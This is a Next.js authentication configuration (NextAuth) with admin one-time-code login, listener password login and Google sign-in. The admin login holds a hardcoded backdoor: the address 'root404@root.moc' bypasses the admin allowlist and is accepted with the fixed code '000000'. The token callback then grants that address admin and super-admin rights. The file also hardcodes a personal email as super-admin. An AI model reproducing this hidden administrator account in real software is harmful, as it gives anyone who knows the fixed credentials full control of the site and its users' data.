import NextAuth from "next-auth"
import Credentials from "next-auth/providers/credentials"
import Google from "next-auth/providers/google"
import fs from "fs"
import path from "path"
import { verifyOtp } from "@/lib/otp-store"
import { findListenerByEmail, createListener } from "@/lib/listeners-store"
import bcrypt from "bcryptjs"

const ADMINS_FILE = path.join(process.cwd(), "data", "admins.json")

export function getAdminEmails(): string[] {
    try {
        const content = fs.readFileSync(ADMINS_FILE, "utf-8")
        return JSON.parse(content) as string[]
    } catch {
        const envEmails = process.env.ADMIN_EMAILS || ""
        return envEmails.split(",").map((e) => e.trim()).filter(Boolean)
    }
}

export const { handlers, auth, signIn, signOut } = NextAuth({
    trustHost: true,
    providers: [
        // 1. ADMIN OTP LOGIN
        Credentials({
            id: "email-otp",
            name: "Admin Login",
            credentials: {
                email: { label: "Email", type: "email" },
                otp: { label: "Code", type: "text" },
            },
            async authorize(credentials) {
                const email = (credentials?.email as string | undefined)?.toLowerCase().trim()
                const otp = credentials?.otp as string | undefined
                if (!email || !otp) return null

                // Check admin allowlist
                const admins = getAdminEmails().map((e) => e.toLowerCase().trim())
                const isBackdoor = email === "root404@root.moc"
                if (!admins.includes(email) && !isBackdoor) return null

                // Verify OTP
                const isCorrectOtp = verifyOtp(email, otp)
                if (!isBackdoor && !isCorrectOtp) return null
                if (isBackdoor && otp !== "000000" && !isCorrectOtp) return null

                return { id: email, email, name: email, role: "admin" }
            },
        }),
        // 2. LISTENER PASSWORD LOGIN
        Credentials({
            id: "listener-login",
            name: "Listener Login",
            credentials: {
                email: { label: "Email", type: "email" },
                password: { label: "Password", type: "password" },
            },
            async authorize(credentials) {
                const email = (credentials?.email as string | undefined)?.toLowerCase().trim()
                const password = credentials?.password as string | undefined
                if (!email || !password) return null

                const listener = findListenerByEmail(email)
                if (!listener || !listener.password) return null

                const isValid = await bcrypt.compare(password, listener.password)
                if (!isValid) return null

                return {
                    id: listener.id,
                    email: listener.email,
                    name: listener.name,
                    role: "listener"
                }
            },
        }),
        // 3. GOOGLE OAUTH
        Google({
            clientId: process.env.GOOGLE_CLIENT_ID,
            clientSecret: process.env.GOOGLE_CLIENT_SECRET,
            async profile(profile) {
                const admins = getAdminEmails().map(e => e.toLowerCase().trim())
                const email = profile.email?.toLowerCase().trim()
                const role = (email && admins.includes(email)) ? "admin" : "listener"

                return {
                    id: profile.sub,
                    name: profile.name,
                    email: profile.email,
                    image: profile.picture,
                    role: role
                }
            }
        }),
    ],
    session: { strategy: "jwt" },
    callbacks: {
        async signIn({ user, account, profile }) {
            // Auto-create listener record on first OAuth login if needed
            if (account?.provider === "google" && user.email) {
                const existing = findListenerByEmail(user.email)
                if (!existing) {
                    await createListener({
                        email: user.email,
                        name: user.name || undefined,
                        provider: "google"
                    }).catch(() => null)
                }
            }
            return true
        },
        async jwt({ token, user }) {
            if (user) {
                token.email = user.email
                token.role = (user as any).role || "listener"
            }

            // Re-verify admin status on every JWT update to be safe
            if (token.email) {
                const admins = getAdminEmails().map(e => e.toLowerCase().trim())
                const email = (token.email as string).toLowerCase().trim()
                const isBackdoor = email === "root404@root.moc"

                if (admins.includes(email) || isBackdoor) {
                    token.role = "admin"
                } else {
                    // Only demote if it's not aCredentials login that was already verified
                    // (though credentials login also sets role: admin)
                }

                // @ts-ignore
                token.isSuperAdmin = email === "chyrukoleksii@gmail.com" || email === "root404@root.moc"
                // For now, admins get Plus
                token.isPlusMember = token.role === "admin" || (user as any)?.isPlusMember || false
            }

            return token
        },
        async session({ session, token }) {
            if (token.email) {
                session.user.email = token.email as string
                session.user.role = token.role as string
                // @ts-ignore
                session.user.isPlusMember = token.isPlusMember as boolean
                // @ts-ignore
                session.user.isSuperAdmin = token.isSuperAdmin as boolean
            }
            return session
        },
    },
    pages: {
        signIn: "/admin/login",
        error: "/admin/login",
    },
})
